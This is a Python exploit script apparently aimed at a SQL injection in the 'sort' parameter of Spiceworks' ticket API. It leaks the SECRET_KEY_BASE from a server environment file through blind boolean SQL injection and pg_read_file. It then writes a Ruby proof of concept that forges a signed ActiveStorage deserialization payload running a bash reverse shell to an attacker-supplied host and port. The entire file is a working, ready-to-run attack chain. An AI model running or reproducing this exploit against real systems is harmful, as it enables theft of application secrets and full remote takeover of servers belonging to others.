#!/usr/bin/env python3

import requests
import string
import re
import argparse
from urllib3.exceptions import InsecureRequestWarning
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def start_session():
	s = requests.session()
	s.verify = False
	s.get(base_url + '/sign_in')
	s.post(base_url + '/auth/identity/callback', data={"auth_key": username, "password": password})
	return s

def test_boolean_statement(payload):
	SQL = '(SELECT (CASE WHEN ({payload}) THEN 1 ELSE 1/(SELECT 0) END))'
	r = s.get(vuln_url + SQL.format(payload=payload).replace(' ', '/**/'))
	return r.status_code == 200

def next_char_is(c, leaked):
	return test_boolean_statement(f"select ascii(pg_read_file('{env_path}',{len(leaked)},1))={ord(c)}")

def leak_secret_key():	
	charset = string.printable
	p = re.compile('SECRET_KEY_BASE="([0-9A-Fa-f]+)"')
	leaked = ''
	print(f"Starting to leak {env_path}")
	while True:
		found = False
		for c in charset:
			if next_char_is(c, leaked):
				leaked += c
				found = True
				print(f"{leaked.splitlines()[-1]}", end='\r')
				if c == '\n': print() 
				break
		if not found:
			print("exhausted charset and didn't find a match, exiting")
			exit(1)
		if p.search(leaked) is not None:
			m = p.search(leaked)
			return m.group(1)

def write_ruby_poc():
	exploit_template = f"""#!/usr/bin/env ruby
require "base64"
require "erb"
require "./config/environment"
require 'uri'
require 'net/http'

base_url = "{base_url}/rails/active_storage/disk/"

secret_key_base = "{secret_base_key}"
key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")
verifier = ActiveSupport::MessageVerifier.new(secret)
code = '`/bin/bash -c "/bin/bash -i &> /dev/tcp/{lhost}/{lport} 0>&1"`'
erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
payload = verifier.generate(dump_target, purpose: :blob_key)

vuln_url = base_url + payload + '/doesnotexist'
uri = URI(vuln_url)
req = Net::HTTP::Get.new(uri.path)
res = Net::HTTP.start(
				uri.host, uri.port,
				:use_ssl => uri.scheme == 'https',
				:verify_mode => OpenSSL::SSL::VERIFY_NONE) do |https|
	https.request(req)
end
"""
	dir = "rce/"
	filename = "rce.rb"
	with open(dir + filename, "w") as outfile:
		outfile.write(exploit_template)
		print(f"RCE exploit saved to {filename}")
		print(f"To get a reverse shell:\n\t1. Setup a listener on {lhost}:{lport}\n\t2. Execute PoC with: cd {dir} && ruby {filename}")


def parse_args():
	# parse the arguments
	parser = argparse.ArgumentParser(description="There's a SQLi in a `sort` parameter of Spiceworks. The exploit chain is SQLi -> file read -> RCE.")
	parser.add_argument('--rhost', help="https://example.com", required=True)
	parser.add_argument('--lhost', help="10.10.10.10", required=True)
	parser.add_argument('--lport', help="9001", required=True)
	parser.add_argument('-u', '--user', help="test@test.com", required=True)
	parser.add_argument('-p', '--password', help="P@$$w0rd!", required=True)
	parser.add_argument('-e', '--env_path', help="Path to environment variables", default='/var/opt/tron/etc/env')
	return parser.parse_args()

if __name__ == '__main__':
	# parse args
	args = parse_args()
	base_url = args.rhost
	lhost = args.lhost
	lport = args.lport
	username = args.user
	password = args.password
	env_path = args.env_path

	# start exploit
	vuln_url = base_url + '/api/tickets?filter%5Bstatus%5D%5Beq%5D=open&sort='
	s = start_session()
	secret_base_key = leak_secret_key()
	print(f"Leaked secret_base_key: {secret_base_key}")
	write_ruby_poc()